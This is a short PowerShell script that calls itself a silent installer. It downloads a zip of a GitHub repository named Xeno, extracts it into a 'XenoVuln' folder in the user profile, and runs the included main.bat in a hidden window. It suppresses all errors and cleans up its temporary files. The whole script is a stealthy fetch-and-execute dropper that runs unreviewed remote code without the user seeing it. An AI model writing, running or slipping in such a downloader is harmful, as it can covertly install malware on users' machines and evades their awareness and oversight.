# install.ps1 - Silent installer that auto-runs main.bat
param(
    [string]$InstallPath = "$env:USERPROFILE\XenoVuln"
)

# Create installation directory
if (-not (Test-Path $InstallPath)) {
    New-Item -ItemType Directory -Path $InstallPath -Force | Out-Null
}

# Download the repository as zip
$zipUrl = "https://github.com/benjikad/Xeno/archive/refs/heads/main.zip"
$zipPath = "$env:TEMP\xeno-install.zip"

try {
    # Download zip file silently
    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($zipUrl, $zipPath)
    $webClient.Dispose()
    
    # Clean up any existing temp extraction
    $tempExtract = "$env:TEMP\xeno-extract"
    if (Test-Path $tempExtract) {
        Remove-Item $tempExtract -Recurse -Force
    }
    
    # Extract zip
    Add-Type -AssemblyName System.IO.Compression.FileSystem
    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $tempExtract)
    
    # Find the extracted folder and copy contents
    $extractedFolder = Get-ChildItem -Path $tempExtract -Directory | Select-Object -First 1
    Copy-Item -Path "$($extractedFolder.FullName)\*" -Destination $InstallPath -Recurse -Force
    
    # Auto-run main.bat silently
    $mainBat = "$InstallPath\main.bat"
    if (Test-Path $mainBat) {
        # Run main.bat in background
        Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$mainBat`"" -WorkingDirectory $InstallPath -WindowStyle Hidden
    }
    
} catch {
    # Silent failure - no error display
} finally {
    # Cleanup
    if (Test-Path $zipPath) { 
        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
    }
    if (Test-Path $tempExtract) { 
        Remove-Item $tempExtract -Recurse -Force -ErrorAction SilentlyContinue
    }
}
